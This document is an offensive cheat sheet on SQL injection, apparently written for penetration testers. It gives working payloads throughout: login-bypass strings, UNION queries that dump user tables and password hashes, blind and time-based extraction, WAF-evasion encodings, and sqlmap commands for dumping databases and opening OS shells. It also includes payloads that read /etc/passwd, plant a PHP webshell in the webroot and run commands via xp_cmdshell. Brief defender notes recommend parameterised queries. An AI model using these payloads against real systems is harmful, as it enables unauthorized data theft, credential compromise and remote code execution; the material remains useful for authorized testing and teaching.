# SQL Injection (SQLi)

Inject SQL through unsanitised input so the database runs *your* query — bypass auth, dump
the whole database, read/write files, or get code execution on the DB host. Manual payloads
to understand it; **sqlmap** to move fast.

Replace placeholders (`<...>`) with your own values: `<target>`, `<param>`, `<db>`, `<your-ip>`.
For per-DBMS syntax (Oracle/MSSQL/PostgreSQL/MySQL differences) see the **sqli-syntax** sheet.

---
---

# PART 1 — OVERVIEW (at a glance)

## The techniques (pick by what the app gives back)

| Technique | When to use | Reads data via |
|-----------|-------------|----------------|
| **Auth bypass** | Login form | Rewriting the `WHERE` logic to always-true |
| **UNION (in-band)** | Query result is printed on the page | Appending your own `SELECT` |
| **Error-based** | DB errors are shown | Forcing data into the error message |
| **Blind — boolean** | No output, but page changes on true/false | One yes/no question at a time |
| **Blind — time** | No output, no visible change | `SLEEP()` when a condition is true |
| **Out-of-band (OAST)** | Fully blind, no timing | DNS/HTTP callback to your server |

## The workflow

1. **Find** — break the query with a quote; confirm with true/false pair.
2. **Fingerprint** the DBMS (MySQL / PostgreSQL / MSSQL / Oracle) — syntax differs.
3. **Choose a technique** from the table above based on what's visible.
4. **Extract** — schema → tables → columns → rows.
5. **Escalate** — crack looted hashes, read/write files, `--os-shell` → RCE, reuse creds to pivot.

## Go-to payloads

```sql
'                                  -- does it break? (single quote)
' OR '1'='1' --                    -- auth bypass
1' ORDER BY 5-- -                  -- column count (increment until error)
-1' UNION SELECT 1,2,3-- -         -- find printed columns
1' AND SLEEP(5)-- -                -- blind confirm (MySQL)
```

```bash
sqlmap -r request.txt --batch --dump      # capture request in Burp → save → let sqlmap work
```

## Defender notes (for the report)

- **Parameterised queries / prepared statements** — the only real fix. Never concatenate input.
- Least-privilege DB user (no `FILE`, no `xp_cmdshell`, not `sa`/`root`/DBA for the web app).
- Allowlist input validation + a WAF as defence-in-depth (not a primary control).

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Find the injection point

Add a single quote and watch for a SQL error or a behaviour change. Then prove it with a
true/false pair — a difference means the input reaches the query.

```sql
<param>='                          -- 500 / "SQL syntax error" = likely injectable
<param>=1' AND '1'='1              -- normal page
<param>=1' AND '1'='2              -- different/empty page  → injectable
```

```
what you see: a stack trace or "You have an error in your SQL syntax ... near '''"
```

Test **everything**, not just `?id=`: GET params, POST fields, JSON values, and headers
(`Cookie`, `User-Agent`, `Referer`, `X-Forwarded-For`). Try numeric context (no quote:
`1 AND 1=1`) and string context (`1' AND '1'='1`).

## Step 2 — Fingerprint the DBMS

Syntax (string concat, version function, comments) differs per database. Quick tells:

```sql
' AND 1=CONVERT(int,@@version)-- -     -- MSSQL leaks version in the error
' AND extractvalue(1,version())-- -    -- MySQL error-based version
version()        -- MySQL / PostgreSQL      @@version -- MSSQL
' || (SELECT banner FROM v$version)-- -     -- Oracle
```

> Full per-DBMS matrix (concat, substring, time delay, error trick, OOB) is in **sqli-syntax**.

## Step 3 — Auth bypass (login forms)

Make the `WHERE` clause always true and comment out the password check.

```sql
Username: admin' --                 -- log in as admin, skip the password
Username: ' OR '1'='1' --           -- returns the first user
Username: admin'/*                  -- if -- is filtered
Password: anything
```

```
original query:  SELECT * FROM users WHERE user='admin' -- ' AND pass='...'
                                                         ^ everything after -- is a comment
```

## Step 4 — UNION-based extraction (data is printed)

**4a. Column count** — `UNION` needs the same number of columns. Increment `ORDER BY` until it errors:

```sql
<param>=1' ORDER BY 1-- -
<param>=1' ORDER BY 2-- -           -- ... last value that works = column count
```

**4b. Which columns are printed** — make the original row empty (`-1`) so yours shows:

```sql
<param>=-1' UNION SELECT 1,2,3-- -  -- note which numbers appear on the page
```

**4c. Pull data into the printed columns** (say 2 and 3 printed):

```sql
-1' UNION SELECT 1,version(),database()-- -
-1' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
-1' UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -
```

> If columns are typed (int vs string) and `version()` errors in a numeric column, use `NULL`
> for the others: `UNION SELECT NULL,version(),NULL-- -`.

## Step 5 — Blind SQLi (no visible output)

**Boolean-based** — the page differs on true vs false; ask one yes/no question at a time:

```sql
<param>=1' AND 1=1-- -                        -- true  → normal page
<param>=1' AND 1=2-- -                        -- false → different/empty page
<param>=1' AND SUBSTRING(version(),1,1)='8'-- -   -- infer char by char
<param>=1' AND (SELECT COUNT(*) FROM users)>0-- -
```

**Time-based** — no visible change at all; make the DB sleep when a condition is true:

```sql
<param>=1' AND IF(1=1,SLEEP(5),0)-- -                 -- MySQL
<param>=1'; SELECT pg_sleep(5)-- -                    -- PostgreSQL (stacked)
<param>=1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -      -- PostgreSQL inline
<param>=1'; WAITFOR DELAY '0:0:5'-- -                 -- MSSQL
```

```
what you see: response returns in ~5s when the condition is TRUE, instantly when FALSE
```

**Out-of-band** — fully blind, exfil via a DNS/HTTP callback (see sqli-syntax for OOB payloads).

## Step 6 — Escalate beyond data

```sql
-- read a file (needs FILE privilege / correct DBMS):
-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -                 -- MySQL
-- write a webshell into the webroot:
-1' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/sh.php'-- -
-- MSSQL command execution:
'; EXEC xp_cmdshell 'whoami'-- -
```

## Step 7 — Automate with sqlmap

Capture the request in Burp → `Save item` → `request.txt`, then:

```bash
sqlmap -r request.txt --batch                 # confirm + fingerprint
sqlmap -u "http://<target>/page?id=1" -p id --batch
sqlmap -r request.txt --dbs                    # list databases
sqlmap -r request.txt -D <db> --tables
sqlmap -r request.txt -D <db> -T users --dump
sqlmap -r request.txt --current-user --is-dba  # privilege check
sqlmap -r request.txt --os-shell               # OS shell (DBA + stacked queries)
```

Useful flags: `--level=5 --risk=3` (deeper), `--tamper=space2comment,between` (WAF evade),
`--threads=10`, `--dump-all`, `--technique=BEUSTQ` (restrict techniques).

---
---

# PART 3 — PAYLOAD ARSENAL

## Comment / terminator styles

| DBMS | Line comment | Inline | Stacked queries |
|------|-------------|--------|-----------------|
| MySQL | `-- ` (trailing space) or `#` | `/* */` | usually **no** |
| PostgreSQL | `-- ` | `/* */` | **yes** (`;`) |
| MSSQL | `-- ` | `/* */` | **yes** (`;`) |
| Oracle | `-- ` | `/* */` | no |

> `-- -` (dash-dash-space-dash) is a safe universal comment — the trailing char guarantees the space survives URL trimming.

## Auth-bypass strings (rotate through)

```sql
' OR 1=1-- -           ' OR '1'='1'-- -         admin'-- -          admin'#
' OR 1=1 LIMIT 1-- -   ') OR ('1'='1'-- -       " OR "1"="1"-- -    ' OR 1=1/*
```

## UNION templates

```sql
' ORDER BY N-- -                                   -- column count
' UNION SELECT NULL,NULL,NULL-- -                  -- type-safe probe
' UNION SELECT 1,2,3-- -                           -- find printed columns
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,password),3 FROM users-- -   -- MySQL (all rows, one cell)
```

## Blind extraction primitives

```sql
AND SUBSTRING((SELECT ...),1,1)='a'          -- MySQL/MSSQL: char at position
AND ASCII(SUBSTR((SELECT ...),1,1))>77       -- binary-search a char faster
AND (SELECT COUNT(*) FROM users)=3           -- count rows
AND LENGTH((SELECT database()))=5            -- length of a value
IF(<cond>,SLEEP(5),0)   /   CASE WHEN <cond> THEN pg_sleep(5) ELSE 0 END   -- time gates
```

## WAF / filter bypass

```sql
-- keyword filtered: mixed case + inline comment
UnIoN SeLeCt   /   UN/**/ION SE/**/LECT
-- space filtered: comments or whitespace alternatives
'/**/OR/**/1=1-- -     ' OR%091=1-- -   (tab)   %0aOR%0a (newline)
-- quotes filtered: use hex / CHAR()
WHERE table_name=0x7573657273          -- 'users' as hex
WHERE table_name=CHAR(117,115,101,114,115)
-- equals filtered: use LIKE / IN
AND 1 LIKE 1     AND user() IN ('root@localhost')
-- sqlmap tampers: space2comment, between, charencode, randomcase, modsecurityversioned
```

## sqlmap flag reference

```bash
-r req.txt / -u URL / -p param   # target
--batch                          # non-interactive (assume defaults)
--dbs --tables --columns --dump  # enumerate → extract
-D db -T tbl -C col --dump       # scope the extraction
--current-user --is-dba --priv   # who am I, am I DBA
--os-shell --sql-shell           # interactive shells
--technique=BEUSTQ               # B=bool E=err U=union S=stacked T=time Q=inline
--level=5 --risk=3               # deeper/riskier tests
--tamper=NAME --random-agent     # evasion
--dump-format=CSV --output-dir=. # loot handling
```

---

**Key idea:** SQLi happens when input is concatenated into a query instead of parameterised.
You break out of the data context with a quote, then either rewrite the logic (auth bypass),
append a `SELECT` (UNION), or ask yes/no questions and read the answer from the page or the
response time (blind). The fix is always **prepared statements / parameterised queries**.
